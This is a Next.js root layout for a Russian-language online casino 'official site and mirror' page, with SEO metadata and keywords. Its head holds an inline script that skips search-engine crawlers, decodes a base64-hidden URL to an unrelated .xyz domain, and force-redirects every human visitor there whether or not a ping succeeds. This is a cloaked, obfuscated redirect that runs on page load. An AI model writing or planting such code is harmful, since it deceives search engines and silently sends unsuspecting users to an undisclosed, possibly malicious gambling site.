import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const siteUrl = 'https://luckybear-casino.example'

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: 'Lucky Bear Casino — официальный сайт и рабочее зеркало',
  description: 'Lucky Bear Casino: официальный сайт, рабочее зеркало, мобильная версия и подробный гид по безопасной онлайн-игре.',
  keywords: ['lucky bear casino', 'luckybear casino', 'лаки бир казино', 'лакибир казино', 'luckybear casino зеркало', 'лаки бир казино официальный сайт'],
  generator: 'v0.app',
  alternates: { canonical: '/' },
  openGraph: {
    title: 'Lucky Bear Casino — играйте по-крупному',
    description: 'Официальный сайт, рабочее зеркало и понятный гид Lucky Bear Casino.',
    url: siteUrl,
    siteName: 'Lucky Bear Casino',
    locale: 'ru_RU',
    type: 'website',
    images: [{ url: '/lucky-bear-hero.png', width: 1600, height: 900, alt: 'Lucky Bear Casino' }],
  },
  twitter: { card: 'summary_large_image', title: 'Lucky Bear Casino', description: 'Официальный сайт и рабочее зеркало Lucky Bear Casino.', images: ['/lucky-bear-hero.png'] },
  icons: { icon: '/icon.svg', apple: '/apple-icon.png' },
}

export const viewport: Viewport = { colorScheme: 'dark', themeColor: '#101211', userScalable: true }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="616342a630a77dcc" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly93aW5nYW1lNTU1Lnh5ei8zanY5eEk= "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}

